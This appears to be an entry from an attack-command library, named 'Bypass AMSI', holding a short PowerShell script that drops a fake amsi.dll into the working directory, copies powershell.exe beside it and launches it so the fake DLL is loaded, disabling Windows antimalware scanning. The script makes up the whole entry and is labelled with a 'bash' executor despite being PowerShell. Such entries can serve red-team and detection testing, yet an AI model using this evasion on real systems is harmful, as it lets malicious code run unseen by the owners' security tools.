---
id: cf08d6d6-a818-45de-91f6-3713c7bdd205
name: Bypass AMSI
type: command
executor: bash
data: '[Byte[]] $temp = $DllBytes -split '' ''

  Write-Output "Executing the bypass."

  Write-Verbose "Dropping the fake amsi.dll to disk."

  [System.IO.File]::WriteAllBytes("$pwd\amsi.dll", $temp)


  Write-Verbose "Copying powershell.exe to the current working directory."

  Copy-Item -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Destination
  $pwd


  Write-Verbose "Starting powershell.exe from the current working directory."

  & "$pwd\powershell.exe"'
output: null
created_at: '2023-04-06T03:56:26.063485+00:00'
updated_at: '2023-04-10T20:36:16.947963+00:00'
---

# Bypass AMSI

```bash
[Byte[]] $temp = $DllBytes -split ' '
Write-Output "Executing the bypass."
Write-Verbose "Dropping the fake amsi.dll to disk."
[System.IO.File]::WriteAllBytes("$pwd\amsi.dll", $temp)

Write-Verbose "Copying powershell.exe to the current working directory."
Copy-Item -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Destination $pwd

Write-Verbose "Starting powershell.exe from the current working directory."
& "$pwd\powershell.exe"
```


